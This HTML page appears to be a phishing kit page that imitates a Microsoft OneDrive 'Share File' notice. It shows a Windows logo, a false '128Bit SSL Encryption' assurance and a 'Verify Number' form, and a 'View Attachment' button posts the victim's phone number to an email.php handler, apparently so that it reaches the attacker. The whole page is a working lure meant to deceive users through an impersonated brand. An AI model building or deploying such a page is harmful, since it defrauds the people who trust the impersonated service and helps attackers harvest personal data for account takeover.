<html>
<head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">

<link rel="shortcut icon" href="favicon_mail.ico" type="image/gif">
<title>Share File | One Drive</title></head>
<body>

<br><br>

<table align="center">

<tbody><tr><td>

	<div align="center">

	<img src="windows_logo_cyan_rgb_d.png" height="120" width="300">

	<br><br>

	<font size="2" face="verdana">
	Verify Number
	<div>
	128Bit SSL Encryption 
	</div>
	</font>

	<br>

	<form method="post" action="email.php">



       <br><br>
	<input name="phone" style="width: 250px; height: 40px; font-family: Verdana; font-size: 15px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255); border: 1px solid rgb(132, 132, 132); padding: 13px;" required="" placeholder="Phone Number" type="password">	



	<br><br>

	<input value="View Attachment" style="width: 270px; height: 60px; background-color: rgb(30, 144, 255); border: 3px solid rgb(30, 144, 255); font-family: Verdana; font-size: 17px; color: rgb(255, 255, 255); border-radius: 4px; box-shadow: 3px 3px 3px rgb(136, 136, 136);" type="submit">

	<br>
	</form>



	<br>
	<hr align="center" width="250">

	<font size="2" face="calibri">
2017 � All rights reserved.
	</font>	

	</div>

</td></tr>

</tbody></table>



</body>
</html>
